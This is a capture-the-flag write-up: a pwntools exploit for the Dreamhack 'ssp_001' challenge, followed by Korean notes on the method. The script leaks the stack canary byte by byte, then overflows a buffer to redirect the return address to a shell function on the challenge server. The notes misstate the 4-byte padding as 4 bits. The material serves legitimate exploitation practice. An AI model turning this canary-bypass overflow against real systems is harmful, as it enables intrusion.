# Payload
```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

context.log_level = "debug"
context.binary = '/home/user/Desktop/Dreamhack/33/ssp_001'
context.terminal = ['tmux', 'splitw', '-h']
context.gdb_binary = '/usr/local/bin/pwndbg'

# p = process(context.binary.path)
p = remote(host="host3.dreamhack.games", port=22571)

canary = []
for i in range(128, 132):
    p.sendlineafter(b'> ', b'P')
    p.sendlineafter(b': ', b'%d' % i)
    p.recvuntil(b'is : ')
    canary.append(int(p.recvn(2), 16))

canary = u32(bytes(canary))
slog("canary : ", canary)

payload = b'A'*0x40
payload += p32(canary)
payload += b'B'*0x4 # sfp
payload += b'C'*0x4 # saved edi(callee-saved)
payload += p32(0x080486b9) # get_shell addr

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b': ', b'%d' % len(payload))
p.sendlineafter(b': ', payload)
p.interactive()
```
# 풀이 과정
- 우선 32비트임에 유의하자
- 함수가 여러 개 있는데,
	- F는 사실 할 수 있는게 딱히 없다.
	- P 선택시 카나리 유출
	- E 선택시 이름 입력으로 버퍼 오버플로우로 RET 주소 변경
- 구조 파악이 중요하다.
- 단위 변환도 더 익숙해 져야 한다.
	- 파이썬 자료형을 다시 공부해야 하나?
- 디스어셈블리를 하면서 함수 프롤로그에 push하는게 어느 값인지 확인해야 한다.
	- 항상 sfp + ret만 있다는 보장은 없다.
	- 32비트에서는 edi도 중간에 push 할 수 있다. (system V ABI, Linux 환경 + 32비트일때 확률 높아짐)
	- 따라서 sfp 4비트 말고 edi용 추가 4비트 더미가 필요할 수 있다.
